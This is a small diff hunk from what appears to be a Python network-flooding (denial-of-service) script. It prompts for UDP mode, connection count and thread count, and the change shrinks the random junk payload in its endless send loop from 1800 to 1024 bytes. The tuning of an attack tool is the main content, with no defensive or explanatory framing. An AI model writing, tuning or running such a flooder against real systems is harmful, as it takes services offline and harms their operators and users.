@@ -59,7 +59,7 @@ choice = str(input("\u001b[37m[ + ] UDP(y/n) :\u001b[35m  "))
 times = int(input("\u001b[37m[ + ] CONNECTIONS :\u001b[35m  "))
 threads = int(input("\u001b[37m[ + ] THREADS :\u001b[35m  "))
 def run():
-	data = random._urandom(1800)
+	data = random._urandom(1024)
 	i = random.choice(("[ 1 ]","[ 2 ]","[ 3 ]"))
 	while True:
 		try:
